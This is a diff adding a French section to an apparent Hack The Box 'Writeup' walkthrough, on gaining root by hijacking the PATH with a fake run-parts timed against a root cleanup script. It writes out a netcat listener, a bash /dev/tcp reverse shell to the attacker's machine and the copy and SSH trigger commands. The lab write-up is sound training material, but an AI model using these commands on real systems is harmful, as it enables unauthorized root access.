@@ -667,6 +667,140 @@ Voici quelques idées pour des faux `run-parts` :
 
 ---
 
+## Exploitation du détournement de PATH avec Tilix (méthode « 4 fenêtres »)
+
+L’analyse du comportement système à l’aide de **pspy64** a révélé l’exécution périodique d’un script **cleanup.pl**, lancé **toutes les minutes avec les privilèges root**.
+
+ Ce script effectue un nettoyage agressif de plusieurs répertoires, notamment :
+
+- `/usr/local/bin`
+- `/usr/local/sbin`
+
+Cela a une conséquence directe sur l’exploitation :
+ 👉 **tout détournement de PATH par création d’un faux binaire `run-parts` doit impérativement être réalisé dans la minute qui suit le passage de `cleanup.pl`.**
+
+Pour gérer cette contrainte temporelle de manière fiable, on va utiliser une organisation très précise du travail avec **Tilix et un workspace à 4 fenêtres**, comme décrit dans la recette **mon-tilix-4-fenetres**.
+
+[image]
+
+------
+
+## Organisation des 4 fenêtres Tilix
+
+Chaque fenêtre a un rôle bien défini. Cette organisation te permet d’agir **rapidement et sans erreur** au bon moment.
+
+### Fenêtre 1 — Kali Linux : écoute du reverse shell
+
+Sur ta machine Kali, prépare l’écoute réseau qui recevra le reverse shell root :
+
+```
+nc -lvnp 4444
+```
+
+Cette fenêtre reste **ouverte et en attente** pendant toute la manipulation.
+
+### Fenêtre 2 — jkr@writeup.htb : préparation du faux `run-parts`
+
+Dans cette fenêtre, tu vas **préparer** le binaire piégé, **sans encore le copier**.
+
+1. Place-toi dans `/usr/local` :
+
+```
+cd /usr/local
+```
+
+1. Crée un script de reverse shell (par exemple `reverse_shell`) :
+
+```
+nano reverse_shell
+```
+
+1. Ajoute le contenu suivant (adapte l’IP à celle de ta machine Kali) :
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.xxx/4444 0>&1
+```
+
+1. Rends le script exécutable :
+
+```
+chmod +x reverse_shell
+```
+
+1. **Prépare** la commande de copie vers `/usr/local/bin/run-parts`, **mais ne l’exécute pas encore** :
+
+```
+cp reverse_shell /usr/local/bin/run-parts
+```
+
+👉 À ce stade, **tu n’appuies pas sur Entrée**. La commande est prête.
+
+### Fenêtre 3 — jkr@writeup.htb : surveillance avec pspy64
+
+Dans cette fenêtre, lance **pspy64** pour surveiller l’activité système en temps réel :
+
+```
+./pspy64
+```
+
+Cette fenêtre est **ta référence temporelle**.
+ Tu attends explicitement l’apparition de l’exécution de **cleanup.pl**.
+
+### Fenêtre 4 — jkr@writeup.htb : connexion SSH prête à être lancée
+
+Prépare ici une nouvelle connexion SSH, **sans valider la commande** :
+
+```
+ssh jkr@writeup.htb
+```
+
+Cette session servira à **déclencher indirectement l’exécution du script root vulnérable**, qui appellera `run-parts` sans chemin absolu.
+
+------
+
+## Déclenchement synchronisé de l’exploitation
+
+Tout repose maintenant sur le **timing**.
+
+1. Surveille attentivement la **fenêtre 3**.
+2. Dès que **pspy64 affiche l’exécution de `cleanup.pl`** :
+   - Appuie **immédiatement sur Entrée dans la fenêtre 2** pour copier le faux `run-parts`.
+   - **Juste après**, appuie sur **Entrée dans la fenêtre 4** pour lancer la connexion SSH.
+
+L’objectif est clair :
+ 👉 **placer le faux `run-parts` dans `/usr/local/bin` avant que le script root ne l’appelle**, et **dans la minute suivant le nettoyage**.
+
+------
+
+## Résultat attendu
+
+Si la synchronisation est correcte :
+
+- Le script root appelle `run-parts` **sans chemin absolu**
+- Le binaire piégé dans `/usr/local/bin` est exécuté
+- Un **reverse shell root** arrive dans la **fenêtre 1**
+
+Vérifie immédiatement :
+
+```
+whoami
+```
+
+Tu dois obtenir :
+
+```
+root
+```
+
+## Root.txt
+
+Récupère le flag final :
+
+```
+cat /root/root.txt
+```
+
 ## Conclusion
 
 - Récapitulatif de la chaîne d'attaque (du scan à root).
